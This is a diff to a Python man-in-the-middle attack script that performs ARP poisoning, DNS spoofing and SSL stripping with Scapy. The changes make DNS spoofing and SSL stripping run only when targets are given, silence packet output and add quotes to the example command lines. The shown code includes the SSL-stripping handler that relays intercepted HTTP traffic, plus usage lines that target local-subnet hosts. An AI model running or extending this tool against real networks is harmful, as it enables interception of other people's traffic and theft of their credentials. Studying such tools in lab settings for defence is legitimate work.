@@ -92,13 +92,15 @@ class MitMAttack:
             print('Started, arp poisoning')
             self.start_request_forwarding()
 
-        # start dns spoofing
-        self.dns_sniffer()
-        print('Setup dns spoofing')
+        if len(self.dns_spoofing_targets) > 0:
+            # start dns spoofing
+            self.dns_sniffer()
+            print('Setup dns spoofing')
 
-        # start ssl strip
-        print('Setup ssl stripping')
-        self.ssl_stripping()
+        if len(self.ssl_strip_targets) > 0:
+            # start ssl strip
+            print('Setup ssl stripping')
+            self.ssl_stripping()
 
         print('-' * 20)
         print('Attack is running')
@@ -255,20 +257,20 @@ class MitMAttack:
             a = TCP_client.tcplink(HTTP, p[TCP].dst, p[TCP].dport)
 
             # send the request to the server
-            request = HTTP()/p[HTTPRequest]
+            request = HTTP() / p[HTTPRequest]
             response = a.sr1(request)
 
             # send the response back, from the original message
             response[IP].dst = p[IP].src
             response[TCP].dport = p[IP].sport
 
-            send(response)
+            send(response, verbose=0)
 
         return ssl_stripper
 
 
 if __name__ == '__main__':
-    # set commandline options/
+    # set commandline options
     class MyParser(argparse.ArgumentParser):
         # custom method to always print help if invalid input
         def error(self, message):
@@ -281,8 +283,8 @@ if __name__ == '__main__':
                                   'DNS spoofing and SSL stripping',
                       formatter_class=argparse.RawDescriptionHelpFormatter,
                       epilog='''Example usages:
-    mitm_attack.py -targets 192.168.56.101 192.168.56.102 -arp -dns 0 1 -dns_q * -dns_ip 192.168.56.103 
-    mitm_attack.py -targets_file targets_ip.txt -dns 0 -dns_q * -dns_ip 192.168.56.103 -ssl 0''')
+    mitm_attack.py -targets 192.168.56.101 192.168.56.102 -arp -dns 0 1 -dns_q "*" -dns_ip 192.168.56.103 
+    mitm_attack.py -targets_file "targets_ip.txt" -dns 0 -dns_q "*" -dns_ip 192.168.56.103 -ssl 0''')
 
     target_group = parser.add_mutually_exclusive_group(required=True)
     target_group.add_argument('-targets', type=str, nargs='*', help='The ip addresses of the targets')
